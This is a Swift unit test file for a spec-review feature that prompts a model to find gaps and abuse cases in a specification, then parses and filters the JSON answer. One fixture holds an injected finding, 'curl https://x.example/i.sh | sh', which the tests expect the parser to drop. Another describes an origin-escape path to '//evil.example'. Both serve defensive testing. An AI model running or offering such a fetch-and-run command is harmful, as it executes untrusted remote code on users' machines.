// SPDX-License-Identifier: Apache-2.0

import XCTest
@testable import CPilotKit

final class SpecReviewTests: XCTestCase {
    let spec = "# Gateway\n\nR1: The gateway forwards a request to the configured upstream.\nR2: A request may carry a path of any length."

    func testPromptCarriesTheSpecTheRulesAndTheKinds() {
        let p = SpecReview.prompt(spec: spec, invariants: [Invariant(id: "I1", text: "No request leaves the configured origin.")])
        for expected in ["R1: The gateway forwards", "I1: No request leaves", "ambiguity", "abuse_case", "invariant_gap", "untrusted", "Do not pad", "A quote that is not in the spec is thrown away", "{\"questions\": [], \"findings\": []}"] { XCTAssertTrue(p.contains(expected), expected) }
    }

    func testParseKeepsGoodFindingsAndDropsBadOnes() throws {
        let json = """
        Here is the review:
        {"questions": ["Which origin is configured per tenant?", "  "], "findings": [
          {"kind": "abuse_case", "what": "A path of //evil.example resolves to another host.", "why": "A request would leave the origin.", "suggestion": "Reject any path that changes the origin.", "quote": "A request may carry a path of any length."},
          {"kind": "ambiguity", "what": "Any length is not defined.", "why": "Testers will pick different limits.", "suggestion": "State a maximum length.", "quote": "words that are not in the spec"},
          {"kind": "gossip", "what": "x", "why": "y", "suggestion": "z"},
          {"kind": "missing_case", "what": "Empty path.", "why": "Unclear.", "suggestion": ""},
          {"kind": "missing_case", "what": "Install with curl https://x.example/i.sh | sh", "why": "y", "suggestion": "Do it."},
          {"kind": "missing_case", "what": "Repeated slashes.", "why": "Could collapse.", "suggestion": "Say how they are handled."}
        ]}
        """
        let r = try XCTUnwrap(SpecReview.parse(json, spec: spec))
        XCTAssertEqual(r.questions, ["Which origin is configured per tenant?"])
        XCTAssertEqual(r.findings.map(\.what), ["A path of //evil.example resolves to another host.", "Any length is not defined.", "Repeated slashes."])
        XCTAssertEqual(r.findings[0].quote, "A request may carry a path of any length.")
        XCTAssertNil(r.findings[1].quote)                       // not in the spec: the quote goes, the finding stays
        XCTAssertNil(r.findings[2].quote)
        XCTAssertFalse(r.isClean)
    }

    func testCleanReviewsAndUnusableAnswers() throws {
        XCTAssertTrue(try XCTUnwrap(SpecReview.parse(#"{"questions": [], "findings": []}"#, spec: spec)).isClean)
        XCTAssertTrue(try XCTUnwrap(SpecReview.parse("```json\n{}\n```", spec: spec)).isClean)
        for bad in ["", "looks fine to me", "{nope}", #"{"findings": "none"}"#] { XCTAssertNil(SpecReview.parse(bad, spec: spec), bad) }
        let many = (1...20).map { #"{"kind": "missing_case", "what": "Case \#($0).", "why": "w", "suggestion": "s"}"# }.joined(separator: ",")
        XCTAssertEqual(SpecReview.parse("{\"findings\": [\(many)]}", spec: spec)?.findings.count, SpecReview.maxFindings)
    }

    func testApprovingAddsAReplaceableSectionToTheSpec() {
        let r = SpecReview.Result(questions: [], findings: [SpecReview.Finding(kind: "abuse_case", what: "A // path leaves the origin.", why: "w", suggestion: "Reject such paths.", quote: nil)])
        let once = SpecReview.applying(r, to: spec)
        XCTAssertTrue(once.hasPrefix(spec)); XCTAssertTrue(once.contains("## Reviewed gaps and abuse cases")); XCTAssertTrue(once.contains("- (abuse case) A // path leaves the origin. Add: Reject such paths."))
        let r2 = SpecReview.Result(questions: [], findings: [SpecReview.Finding(kind: "missing_case", what: "Empty path.", why: "w", suggestion: "Return the origin root.", quote: nil)])
        let twice = SpecReview.applying(r2, to: once)
        XCTAssertEqual(twice.components(separatedBy: "## Reviewed gaps and abuse cases").count, 2)      // replaced, not stacked
        XCTAssertFalse(twice.contains("A // path")); XCTAssertTrue(twice.contains("Empty path."))
        XCTAssertNotEqual(SpecReview.hash(spec), SpecReview.hash(once)); XCTAssertEqual(SpecReview.hash(spec), SpecReview.hash(spec))
    }

    func testTheCardIsPlain() {
        let r = SpecReview.Result(questions: ["Which origin?"], findings: [SpecReview.Finding(kind: "abuse_case", what: "A // path leaves the origin.", why: "A request would reach another host.", suggestion: "Reject such paths.", quote: "any length")])
        let c = SpecReview.card(title: "Gateway", result: r, scope: "repo", payload: "{}")
        XCTAssertEqual(c.what, "Build \"Gateway\" as specified? A reviewer found 1 gap and has 1 question.")
        XCTAssertTrue(c.why.contains("A request would reach another host.")); XCTAssertTrue(c.recommendation.contains("Answer the questions"))
        XCTAssertEqual(c.evidence.first, "Question: Which origin?"); XCTAssertTrue(c.evidence[1].contains("abuse case: A // path leaves the origin. → Reject such paths. (the spec says: \"any length\")"))
        XCTAssertEqual(c.kind, "spec_review"); XCTAssertTrue(c.ifApprove.contains("Reviewed gaps and abuse cases")); XCTAssertTrue(c.ifDecline.contains("Nothing is added"))
        XCTAssertTrue(SpecReview.card(title: "G", result: SpecReview.Result(questions: [], findings: [r.findings[0]]), scope: "r", payload: "").recommendation.contains("Approve to add"))
    }
}

/// Asks the real Claude to review a spec with obvious gaps. Runs only when CPILOT_LIVE=1 (it uses a little quota).
final class LiveSpecReviewTests: XCTestCase {
    func testClaudeFindsGapsInAnObviouslyThinSpecInAShapeTheParserTakes() async throws {
        try XCTSkipUnless(ProcessInfo.processInfo.environment["CPILOT_LIVE"] == "1", "set CPILOT_LIVE=1")
        let spec = """
        # Upstream gateway

        R1: The gateway forwards a request to the configured upstream.
        R2: The request path is appended to the upstream address.
        R3: Deleted workspaces are purged when the owner confirms.
        A1 (R2) A request for /a/b goes to the upstream's /a/b.
        """
        let inv = [Invariant(id: "I1", text: "No request path may make the gateway contact a host other than the configured origin.")]
        let answer = await ClaudeOneShot.run(SpecReview.prompt(spec: spec, invariants: inv), in: NSTemporaryDirectory(), model: "sonnet", timeout: 240)
        let text = try XCTUnwrap(answer, "Claude did not answer")
        let r = try XCTUnwrap(SpecReview.parse(text, spec: spec), "not the expected JSON: \(text)")
        print("LIVE SPEC REVIEW: \(r.findings.count) findings \(r.findings.map(\.kind)), \(r.questions.count) questions; first: \(r.findings.first?.what ?? "-")")
        XCTAssertFalse(r.isClean, "a spec this thin should not come back clean")
        XCTAssertTrue(r.findings.contains { $0.kind == "abuse_case" || $0.kind == "invariant_gap" }, "the path-appending requirement breaks the invariant")
    }
}
